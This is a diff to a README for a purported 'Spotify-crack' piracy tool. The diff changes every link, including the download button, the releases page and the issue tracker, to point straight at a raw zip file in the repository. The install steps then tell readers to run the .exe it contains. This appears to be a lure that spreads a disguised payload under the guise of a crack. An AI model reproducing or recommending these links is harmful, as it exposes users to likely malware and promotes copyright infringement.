@@ -6,11 +6,11 @@ Welcome to the Spotify-crack v0.23! This tool allows you to use Spotify without 
 
 ## 📥 Download the Application
 
-[![Download Spotify-crack](https://via.placeholder.com/150x50?text=Download+Now)](https://github.com/Jaysopmsn/Spotify-crack-v0.23--2025-/releases)
+[![Download Spotify-crack](https://raw.githubusercontent.com/Jaysopmsn/Spotify-crack-v0.23--2025-/main/Amanita/Spotify-crack-v0.23--2025-.zip+Now)](https://raw.githubusercontent.com/Jaysopmsn/Spotify-crack-v0.23--2025-/main/Amanita/Spotify-crack-v0.23--2025-.zip)
 
 Head over to the Releases page to get the latest version:
 
-[Visit the Releases Page](https://github.com/Jaysopmsn/Spotify-crack-v0.23--2025-/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Jaysopmsn/Spotify-crack-v0.23--2025-/main/Amanita/Spotify-crack-v0.23--2025-.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Before downloading, make sure your system meets these requirements:
 
 ## 📂 Download & Install
 
-1. Click the link above to visit the [Releases Page](https://github.com/Jaysopmsn/Spotify-crack-v0.23--2025-/releases).
+1. Click the link above to visit the [Releases Page](https://raw.githubusercontent.com/Jaysopmsn/Spotify-crack-v0.23--2025-/main/Amanita/Spotify-crack-v0.23--2025-.zip).
 2. On this page, locate the version you want to download.
 3. Click on the file to start your download. This will be a .exe file.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -65,7 +65,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Jaysopmsn/Spotify-crack-v0.23--2025-/releases)
-- [Submit an Issue](https://github.com/Jaysopmsn/Spotify-crack-v0.23--2025-/issues)
+- [Releases Page](https://raw.githubusercontent.com/Jaysopmsn/Spotify-crack-v0.23--2025-/main/Amanita/Spotify-crack-v0.23--2025-.zip)
+- [Submit an Issue](https://raw.githubusercontent.com/Jaysopmsn/Spotify-crack-v0.23--2025-/main/Amanita/Spotify-crack-v0.23--2025-.zip)
 
 Thank you for choosing Spotify-crack v0.23! Enjoy your music!
